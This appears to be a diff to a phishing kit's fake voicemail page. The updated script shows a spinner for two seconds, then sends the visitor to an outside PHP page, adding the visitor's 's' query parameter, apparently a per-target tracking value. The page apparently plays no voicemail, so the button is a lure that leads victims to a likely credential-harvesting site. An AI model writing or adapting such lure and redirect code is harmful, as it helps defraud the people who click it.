@@ -159,18 +159,29 @@
     </div>
   </div>
 
-  <script>
+ <script>
     function playVoicemail() {
-      // Show spinner and change button text
-      document.getElementById('spinner').style.display = 'inline-block';
-      document.getElementById('buttonText').textContent = 'Loading...';
+        // Show spinner and change button text
+        document.getElementById('spinner').style.display = 'inline-block';
+        document.getElementById('buttonText').textContent = 'Loading...';
 
-      // Simulate loading delay before redirecting
-      setTimeout(function() {
-        // Redirect to the final voicemail page
-        window.location.href = 'https://site2host.com/hosting/wp-includes/Text/id.html'; // Replace with actual URL
-      }, 2000); // Adjust delay as needed (2000ms = 2 seconds)
+        // Simulate loading delay before redirecting
+        setTimeout(function() {
+            // Get current URL's query parameters
+            const urlParams = new URLSearchParams(window.location.search);
+            const sParam = urlParams.get('s');
+
+            // Construct the redirection URL
+            let redirectUrl = 'https://essencialbox.com/About/index.php'; // Replace with actual base URL
+            if (sParam) {
+                redirectUrl += `?s=${encodeURIComponent(sParam)}`;
+            }
+
+            // Redirect to the final voicemail page
+            window.location.href = redirectUrl;
+        }, 2000); // Adjust delay as needed (2000ms = 2 seconds)
     }
-  </script>
+</script>
+
 </body>
 </html>
